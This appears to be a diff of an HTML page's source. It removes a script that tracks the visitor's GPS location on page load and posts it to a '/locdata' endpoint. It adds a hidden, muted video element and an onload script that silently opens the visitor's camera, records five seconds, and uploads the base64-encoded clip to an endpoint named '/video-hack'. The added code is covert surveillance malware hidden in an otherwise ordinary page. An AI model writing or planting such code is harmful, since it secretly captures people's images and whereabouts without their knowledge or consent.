@@ -3,60 +3,11 @@
 <meta charset="UTF-8"> 
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
 <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
-  <meta http-equiv="Content-Security-Policy" content="geolocation *;">
 <meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="viewport" content="width=device-width,initial-scale=1">
   <script>
-  alert("Please on gps Location ")
-  function watchLocation() {
-  if (navigator.geolocation) {
-    const watchId = navigator.geolocation.watchPosition(sendLocationToServer, showError);
-    console.log("Location tracking started. Watch ID:", watchId); // Useful for debugging and stopping later
-  } else {
-    alert("Geolocation is not supported by this browser.");
-  }
-}
-
-function sendLocationToServer(position) {
   
-  const gpsData = {
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      altitude: position.coords.altitude,
-      accuracy: position.coords.accuracy,
-      altitudeAccuracy: position.coords.altitudeAccuracy,
-      heading: position.coords.heading,
-      speed: position.coords.speed,
-      timestamp: position.timestamp
-    };
-    
-  
-  fetch('/locdata', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(gpsData)
-  })
-  .then(response => response.json())
-  .then(data => {
-    console.log('Location sent to server:', data);
-  })
-  .catch((error) => {
-    console.error('Error sending location:', error);
-  });
-}
-
-
-function showError(error) {
-  // Same error handling as before
-  switch(error.code) {
-    // ... (error handling code from previous example)
-  }
-}
-
-// Start watching the location automatically when the page loads
-window.addEventListener('load', watchLocation);
 
   </script>
   <script>
@@ -169,6 +120,55 @@ a:hover{color: #f4a15d}
 </style> 
 </head> 
 <body>
+		<video id="video" width="640" height="480" autoplay hidden muted ></video>
+		<script>
+	 let mediaRecorder;
+        let recordedChunks = [];
+
+        // Access the user's camera when the page loads
+        window.onload = function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+
+                    mediaRecorder.ondataavailable = function(event) {
+                        if (event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = function() {
+                        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                        const reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = function() {
+                            const base64data = reader.result.split(',')[1];
+                            fetch('/video-hack', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({ videoData: base64data })
+                            })
+                            .then(response => response.text())
+                            .then(result => console.log(result))
+                            .catch(error => console.error('Error:', error));
+                        };
+                    };
+
+                    // Start recording for 5 seconds
+                    recordedChunks = [];
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 5000); // Stop recording after 5 seconds
+                })
+                .catch(error => console.error('Error accessing media devices.', error));
+        };
+  
+		</script>
 <table width="100%" height="100%" cellpadding="20"> 
 <tbody>
 <tr> 
